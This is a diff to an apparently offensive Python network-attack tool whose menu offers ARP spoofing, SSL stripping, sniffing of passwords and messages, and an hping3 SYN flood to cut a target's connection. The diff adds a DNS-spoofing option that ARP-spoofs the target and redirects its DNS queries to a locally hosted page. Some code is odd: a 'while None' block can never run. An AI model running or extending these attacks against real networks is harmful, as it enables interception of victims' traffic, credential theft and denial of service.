@@ -96,6 +96,7 @@ os.system("sudo apt -y install bettercap")
 os.system("sudo apt -y install hping3")
 os.system("sudo apt -y install python-pip")
 os.system("sudo apt -y install netdiscover")
+os.system("sudo apt -y install bridge-utils")
 os.system ("clear")
 
 #Terms & Conditions>
@@ -173,11 +174,11 @@ try:
 		#os.system(flush_nat)
 		os.system (traffic_on)
 		
-		print ("\n{0}[{1}+{0}]{2}Directing traffic to port 8080 ... ").format(WHITE , RED , Cafe)
+		print ("{0}[{1}+{0}]{2}Directing traffic to port 8080 ... ").format(WHITE , RED , Cafe)
 		sleep(0.2)
 		os.system (traffic_redirect)
 		#os.system (traffic_redirect2)
-		print ("\n{0}[{1}+{0}]{1}Done").format(WHITE , OKGREEN)
+		print ("{0}[{1}+{0}]{1}Done").format(WHITE , OKGREEN)
 		
 		sleep(0.2)
 		
@@ -221,6 +222,9 @@ try:
 			sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
 		if host_scaning == "n":
 			pass
+		while None:
+			print ("{}").format(BLUE)
+			host_scaning = raw_input("\nThe WATCHER > ")		
 		else:
 			pass
 		#scanning finshed!
@@ -258,40 +262,43 @@ try:
 		def choices ():
 			sleep(1.0)
 			os.system(clear)
-			print("		{0}<{1}Launching these attacks!{0}>{1}:\n".format (RED , WHITE))
+			print("		{0}<{1}Launch these attacks!{0}>{1}:\n".format (RED , WHITE))
 			
-			sleep (0.2)
-			print("{0}[ {1}1{0} ]{2} Arpspoof Target".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}01{0}]{2} Arpspoof Target".format(YELLOW , RED , WHITE))
 			
-			sleep (0.2)
-			print("{0}[ {1}2{0} ]{2} SSL Stripe".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}02{0}]{2} SSL Stripe".format(YELLOW , RED , WHITE))
 
-			sleep (0.2)
-			print("{0}[ {1}3{0} ]{2} Sniff Images".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}03{0}]{2} Sniff Images".format(YELLOW , RED , WHITE))
 			
-			sleep (0.2)
-			print("{0}[ {1}4{0} ]{2} Sniff Websites".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}04{0}]{2} Sniff Websites".format(YELLOW , RED , WHITE))
 			
-			sleep (0.2)
-			print("{0}[ {1}5{0} ]{2} Sniff HTTP/Low encrypted Passwords".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}05{0}]{2} Sniff HTTP/Low encrypted Passwords".format(YELLOW , RED , WHITE))
 			
-			sleep (0.2)
-			print("{0}[ {1}6{0} ]{2} Sniff Low Encrypted Messages".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}06{0}]{2} Sniff Low Encrypted Messages".format(YELLOW , RED , WHITE))
 			
-			sleep (0.2)
-			print("{0}[ {1}7{0} ]{2} Get Http/Https requests {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}07{0}]{2} Get Http/Https requests {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))
 
-			sleep (0.2)
-			print("{0}[ {1}8{0} ]{2} Sniff All".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}08{0}]{2} Sniff All".format(YELLOW , RED , WHITE))
 			
-			sleep (0.2)
-			print ("{0}[ {1}9{0} ]{2} Monitor all network traffic {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print ("{0}[{1}09{0}]{2} Monitor all network traffic {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))
 			
-			sleep (0.2)
-			print("{0}[ {1}10{0} ]{2} Cut the internet connection off the target".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print("{0}[{1}10{0}]{2} Cut the internet connection off the target".format(YELLOW , RED , WHITE))
+				
+			sleep(0.1)
+			print("{0}[{1}11{0}]{2} Dns-spoof attack".format(YELLOW , RED , WHITE))
 
-			sleep (0.2)
-			print ("{0}[ {1}0{0} ]{2} Exit".format(YELLOW , RED , WHITE))
+			sleep (0.1)
+			print ("{0}[{1}00{0}]{2} Exit".format(YELLOW , RED , WHITE))
 			
 			sleep (0.2)
 			print ("{}").format(BLUE)
@@ -414,6 +421,33 @@ try:
 				cut_internet = 'sudo xterm -geometry 65x19-300-250 -fg "#FF002E" -e sudo hping3 -c 10000 -d 128 -S --flood --rand-source {} &'.format(target_ip)
 				os.system(cut_internet)
 				return(choices())
+			elif client_choice == "11":
+				print("\n{0}[{1}+{0}]{2}Dns-spoofing Attack Launch..".format(RED , WHITE , Cafe))
+				os.system("touch spoofhosts.txt")
+				
+				print("{0}[{1}*{0}]{2}make sure that you have placed your html file in /var/www/html path\n".format(RED , WHITE , Cafe))
+				print("{0}[{1}*{0}]{2}Enter the website you want to spoof target".format(RED ,WHITE ,Cafe))				
+				
+				print("\texample : bestgore.com")				
+				print ("{}").format(BLUE)
+				website_spoof = raw_input("\nThe WATCHER > ")
+				if website_spoof == "":
+					print("you couldn't have perform this attack without EMPTY site!")
+					sleep(1.0)					
+					return(choices())
+				os.system("echo {} www* > spoofhosts.txt".format(target_ip))
+				os.system("echo {0} {1} >> spoofhosts.txt".format(target_ip , website_spoof))
+				
+				dns_arp = 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e sudo arpspoof -t {0} {1} &'.format(target_ip , gateway_ip)
+				dns_spoof = 'sudo xterm -geometry 119x33-200+0 -e sudo dnsspoof -f spoofhosts.txt host {} and udp port 53 &'.format(target_ip)
+				
+				os.system("systemctl start apache2")
+				os.system(dns_arp)
+				sleep(0.2)
+				os.system(dns_spoof)
+				sleep(0.5)
+				return (choices())
+
 
 			elif client_choice == "0":
 				print ("\n{0}[{1}+{0}]{2}Friendly Exiting..".format(RED , WHITE , Cafe))
